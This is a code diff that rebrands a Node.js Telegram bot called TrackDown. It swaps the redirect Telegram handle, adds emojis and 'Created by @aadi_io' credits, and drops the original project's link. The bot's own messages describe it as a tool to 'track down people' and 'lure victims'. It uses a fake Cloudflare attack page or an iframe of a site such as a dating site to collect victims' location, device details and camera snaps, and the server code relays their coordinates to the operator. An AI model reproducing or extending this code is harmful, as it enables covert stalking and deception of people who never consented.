@@ -31,7 +31,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("https://t.me/aadi_io");
 }
 
          
@@ -50,7 +50,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("https://t.me/aadi_io");
 }
 
          
@@ -70,23 +70,35 @@ if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
   
 if(msg.text=="/start"){
 var m={
-reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
+reply_markup:JSON.stringify({"inline_keyboard":[[{text:"🔗 Create Link",callback_data:"crenew"}]]})
 };
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
+bot.sendMessage(chatId, `🎉 Welcome ${msg.chat.first_name}! 
+
+🚀 You can use this bot to track down people just through a simple link.
+📊 It can gather informations like location, device info, camera snaps.
+
+💡 Type /help for more info.
+
+🔥 Created by @aadi_io`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
 }
 else if(msg.text=="/help"){
-bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create
-to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
-the url it will send you 2 links which you can use to track people.
-\n\nSpecifications.
-\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
-\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
-( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
+bot.sendMessage(chatId,`🎯 Through this bot you can track people just by sending a simple link.
+
+📝 Send /create to begin, afterwards it will ask you for a URL which will be used in iframe to lure victims.
+🔗 After receiving the url it will send you 2 links which you can use to track people.
+
+⚙️ Specifications:
+
+1️⃣ Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
+
+2️⃣ Webview Link: This will show a website (ex bing, dating sites etc) using iframe for gathering information.
+⚠️ Many sites may not work under this method if they have x-frame header present. Ex https://google.com
+
+👨‍💻 Developed by @aadi_io
 `);
 }
   
@@ -117,7 +129,7 @@ if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https'
 var url=cid.toString(36)+'/'+btoa(msg);
 var m={
   reply_markup:JSON.stringify({
-    "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
+    "inline_keyboard":[[{text:"🔄 Create new Link",callback_data:"crenew"}]]
   } )
 };
 
@@ -139,15 +151,39 @@ for(var c in y){
 g+=y[c]+"\n";
 }
   
-bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
+bot.sendMessage(cid, `✅ New links has been created successfully! You can use any one of the below links.
+
+🎯 Target URL: ${msg}
+
+🔗 Your Links:
+
+☁️ CloudFlare Page Link:
+${f}
+
+🌐 WebView Page Link:
+${g}
+
+🚀 Powered by @aadi_io`,m);
 }
 else{
 
-bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
+bot.sendMessage(cid, `✅ New links has been created successfully!
+
+🎯 Target URL: ${msg}
+
+🔗 Your Links:
+
+☁️ CloudFlare Page Link:
+${cUrl}
+
+🌐 WebView Page Link:
+${wUrl}
+
+🚀 Powered by @aadi_io`,m);
 }
 }
 else{
-bot.sendMessage(cid,`⚠️ Please Enter a valid URL , including http or https.`);
+bot.sendMessage(cid,`⚠️ Please Enter a valid URL, including http or https.`);
 createNew(cid);
 
 }  
@@ -185,7 +221,10 @@ if(lon != null && lat != null && uid != null && acc != null){
 
 bot.sendLocation(parseInt(uid,36),lat,lon);
 
-bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
+bot.sendMessage(parseInt(uid,36),`📍 Location Data:
+Latitude: ${lat}
+Longitude: ${lon}
+🎯 Accuracy: ${acc} meters`);
   
 res.send("Done");
 }
